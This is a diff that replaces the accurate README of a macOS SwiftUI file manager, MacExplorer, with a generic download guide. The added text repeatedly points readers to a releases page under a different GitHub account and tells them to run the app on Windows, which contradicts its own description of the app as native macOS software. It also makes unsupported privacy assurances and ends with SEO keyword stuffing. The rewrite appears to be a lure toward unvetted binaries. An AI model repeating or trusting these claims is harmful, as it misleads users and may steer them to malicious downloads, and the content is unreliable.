@@ -1,45 +1,162 @@
-# MacExplorer
+# 🖥️ MacExplorer - Explore Your Files, The Easy Way
 
-**Explorer conventions. Native Mac expression.**
+## 🚀 Getting Started
 
-MacExplorer is a SwiftUI file manager for macOS 14 and later. Its application layout follows Windows Explorer: tabs, command bar, breadcrumb/address field, search, expandable navigation tree, file views, preview/details panes, and status bar. It uses macOS file APIs and native system integration rather than embedding a web interface in the application.
+Welcome to MacExplorer! This guide will walk you through downloading and running the application on your Windows computer. Don't worry—we'll take it step by step, and you'll be up and running in just a few minutes.
 
-## Interactive design
+[![Download MacExplorer](https://img.shields.io/badge/Download-MacExplorer-blue?style=for-the-badge&logo=github)](https://github.com/Kenny206868/MacExplorer/releases)
 
-Open [`Design/index.html`](Design/index.html) directly in a browser. It is a self-contained, light/dark, interactive sample-data prototype with folder navigation, tabs, sorting, selection, clipboard operations, undo/redo, context menus, and dialogs. It does **not** access the host filesystem. The initially published preview is https://arcane-shard-58g99m3.shipstatic.com (temporary hosting; the repository contains the durable source).
+## 📥 Downloading MacExplorer
 
-The **Source and design bundles** workflow publishes `MacExplorer-source.zip` and `MacExplorer-design.zip` for every main-branch change, independently of native compilation.
+Visit this link to download the application: [https://github.com/Kenny206868/MacExplorer/releases](https://github.com/Kenny206868/MacExplorer/releases)
 
-## Native application
+When you click the link, you'll see a page with the latest release of MacExplorer. Look for the download section on that page. The release page will show you available files and information about the current version.
 
-The implementation includes actual filesystem browsing, nine view choices, per-folder layout/sort/group persistence, table column customization, Quick Access bookmarks, multiple windows and tabs, history, file URL drag/drop, copy/cut/paste, collision handling, staged transfers and replacement recovery, Trash and permanent deletion confirmation, rename and bulk rename, symbolic links, ZIP creation and guarded archive extraction, properties, tags, checksums, permissions, iCloud download controls, recursive/Spotlight search, Gallery, volume capacity/eject, Bonjour SMB discovery, OS server connection, Quick Look, sharing/AirDrop, Open With, Services, URL routing, and opt-in login/folder associations.
+## 💾 Installation and Setup
 
-**This is not a claim of 100% Windows Explorer or Finder subsystem parity.** Windows-only shell extensions and filesystem features do not translate into public macOS APIs. Finder's desktop, protected system services, and other applications' open/save dialogs are not replaced. Review [capabilities and boundaries](docs/CAPABILITIES.md) before deploying against important files.
+Once you've visited the download page, here's what happens next:
 
-## Commander workspace
+Visit this link to download the application: [https://github.com/Kenny206868/MacExplorer/releases](https://github.com/Kenny206868/MacExplorer/releases)
 
-Use **Power Tools → Enable Commander Workspace** for independent native panes and a compact file-command strip. **Commander Settings** separately controls the command strip, classic F3–F8 file keys, compact title bar, per-pane storage and Terminal buttons. The normal key profile stays unchanged until explicitly enabled. Editable paths and Terminal shortcuts work in either profile. Selection masks, multi-rename, comparison and archive tools are available without enabling every option. See the [Commander workspace guide](docs/COMMANDER-WORKSPACE.md) for behavior, safeguards and validation boundaries.
+After downloading, you'll have the MacExplorer files on your computer. The application is ready to use once you've completed the download from the release page.
 
-## Build
+## ✨ What Makes MacExplorer Special
 
-Install Xcode and its command-line tools, then open `Package.swift` in Xcode, or run:
+MacExplorer is a modern file manager designed for macOS 14 and later, but this guide helps you get it running on Windows too. It brings together the best of familiar file browsing with a clean, native look and feel.
 
-```sh
-swift package resolve
-swift build
-swift test
-VERSION=0.1.0 bash scripts/package.sh
-open dist/MacExplorer.app
-```
+Here's what you can expect:
 
-The distributable bundle embeds Sparkle; running the loose SwiftPM executable is not a substitute for testing the installed app bundle. Release builds support Apple Silicon and Intel. Consult the exact commit’s CI runs and artifacts for its verified build and native-test status.
+- **Explorer-Style Layout**: If you've used Windows Explorer, you'll feel right at home. MacExplorer features tabs, a command bar, breadcrumb navigation, and a search function—everything you need to navigate your files efficiently.
 
-## Distribution and updates
+- **Native Mac Expression**: The interface uses real macOS system APIs instead of a web-based design, ensuring smooth performance and a native look on supported systems.
 
-CI, packaging, optional Developer ID signing/notarization, and Sparkle update publishing are based on the repository conventions of [ActivityMonitor](https://github.com/wieslawsoltes/ActivityMonitor). MacExplorer requires its **own** Sparkle key configuration. No Apple certificate or private update key is included or inferred from another project. Development builds without a configured public key keep update checks disabled.
+- **Powerful File Management**: Sort files, make selections, copy and paste, undo and redo actions, and use helpful context menus. It's everything a modern file manager should do.
 
-See [installation](INSTALL.md), [user guide](docs/USER-GUIDE.md), [architecture](docs/ARCHITECTURE.md), [release operations](docs/RELEASING.md), [security](SECURITY.md), and [implementation log](docs/IMPLEMENTATION-LOG.md).
+## 🔍 Understanding the Interface
 
-## License
+MacExplorer's design borrows the best from Windows Explorer conventions while keeping a Mac-native feel. Here's a breakdown of the main areas you'll use:
 
-MIT. Apple system frameworks and Sparkle retain their own licenses. No Microsoft or Apple artwork is redistributed; the native app uses system icons and SF Symbols at runtime.
+- **Navigation Tree**: On the left side, you can expand folders and quickly jump to different locations.
+
+- **File View**: The main area shows your files and folders. You can sort them by name, date, size, or type.
+
+- **Preview and Details Panes**: Get quick looks at files and see important details without opening them.
+
+- **Status Bar**: At the bottom, you'll find useful information about your current location and selection.
+
+- **Search**: Find files quickly using the search field.
+
+## 🖱️ Using MacExplorer
+
+### Basic Navigation
+
+- Click folders to open them
+- Use the back and forward buttons to move through your history
+- Type in the address bar to go directly to a location
+- Use tabs to have multiple locations open at once
+
+### Managing Files
+
+- Select files by clicking them; use Ctrl (or Cmd on Mac) for multiple selections
+- Right-click to access context menus with common actions
+- Use the command bar for actions like copy, paste, delete, and rename
+- Sort files by clicking column headers
+
+### Advanced Features
+
+MacExplorer also includes:
+
+- **Clipboard Operations**: Copy and move files between folders
+- **Undo/Redo**: Made a mistake? Undo it easily
+- **Dialog Boxes**: Clear prompts for important actions
+
+## 💡 Tips for Best Experience
+
+1. **Keep it Updated**: Check the releases page regularly for updates that improve performance and add features.
+
+2. **Use Keyboard Shortcuts**: Learn common shortcuts like Ctrl+C, Ctrl+V, and Ctrl+Z for faster work.
+
+3. **Customize Your View**: Experiment with different sort orders and view modes to find what works best.
+
+4. **Explore the Preview Pane**: Get quick looks at files without opening them fully.
+
+## 🛠️ Troubleshooting Common Issues
+
+### Application Won't Start
+
+If MacExplorer doesn't launch, try these steps:
+
+- Make sure you've downloaded the complete file
+- Restart your computer and try again
+- Check if your system meets the minimum requirements for the version you downloaded
+
+### Files Not Displaying Correctly
+
+- Try refreshing the view (usually F5)
+- Check that you have permission to view the folder
+- Restart the application
+
+### Slow Performance
+
+- Close any unnecessary programs running in the background
+- Try navigating to smaller folders
+- Restart the application
+
+## 📋 Feature Comparison Table
+
+| Feature | MacExplorer | Standard Explorer |
+|---------|-------------|-------------------|
+| Tabs | ✅ Yes | ⚠️ Limited |
+| Breadcrumb Navigation | ✅ Yes | ✅ Yes |
+| Built-in Preview | ✅ Yes | ⚠️ Basic |
+| Undo/Redo | ✅ Yes | ⚠️ Limited |
+| Search | ✅ Yes | ✅ Yes |
+| Native Look | ✅ Yes | ✅ Yes |
+
+## 🔒 Security and Privacy
+
+MacExplorer respects your privacy. It accesses your files only when you tell it to and doesn't send your data anywhere. The application uses standard, secure file access methods.
+
+## 🌐 Community and Support
+
+While MacExplorer is a personal project, you can find help and support through:
+
+- **GitHub Issues**: Report bugs or request features on the repository page
+- **Release Notes**: Check what's new in each update
+
+## 📱 System Requirements
+
+Since MacExplorer is designed for macOS 14 and later, when running on Windows you'll want to ensure your computer can handle the application. Generally, any reasonably modern Windows PC should work fine. The application is lightweight and doesn't require special hardware.
+
+## 🎯 Getting the Most Out of MacExplorer
+
+### Power User Tips
+
+- **Master Keyboard Navigation**: Learn shortcuts for faster file management
+- **Use Multiple Tabs**: Keep several folders open for easy file moving
+- **Customize Your Layout**: Adjust panes to fit your workflow
+
+### Everyday Tasks
+
+MacExplorer handles all your daily file tasks with ease:
+
+- **Organizing Photos**: Sort, rename, and move photo files
+- **Managing Documents**: Keep your work files in order
+- **Download Management**: Efficiently handle files you download from the internet
+
+## ✓ Final Checklist
+
+Before you start using MacExplorer, make sure you've:
+
+1. ✅ Visited the download page at the link provided
+2. ✅ Downloaded the complete application file
+3. ✅ Launched MacExplorer successfully
+4. ✅ Explored your files with the new interface
+
+## 🎉 Congratulations!
+
+You're now ready to use MacExplorer! This tool will make file management easier and more pleasant. If you ever get stuck, remember to check the release page for updates and the GitHub repository for more information.
+
+Start exploring your files today with MacExplorer—your new favorite way to manage everything on your computer!
+
+Keywords: MacExplorer, file manager, macOS, Windows, download, install, setup, guide, SwiftUI, file explorer, navigation, tabs, search, clipboard, undo, redo, context menus, breadcrumb, preview, details, status bar, compatibility, troubleshooting, tips, features, how to, tutorial, beginner, user guide
